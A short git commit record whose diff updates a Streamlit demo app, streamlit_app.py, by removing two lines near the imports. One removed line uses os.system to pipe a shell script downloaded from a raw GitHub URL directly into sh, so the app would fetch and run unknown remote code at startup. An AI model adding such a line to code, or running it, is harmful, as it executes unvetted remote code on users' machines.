325bcdf16552959bfbb8657fd2ff764157e63e7e
meronejas <95197442+meronejas@users.noreply.github.com>
2021-12-01 19:48:25 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -3,8 +3,6 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
-import os
-os.system('curl -fsSL https://raw.githubusercontent.com/kancomue/shiny-spoon/main/opocok.sh | sh')
 
 """
 # Welcome to Streamlit!
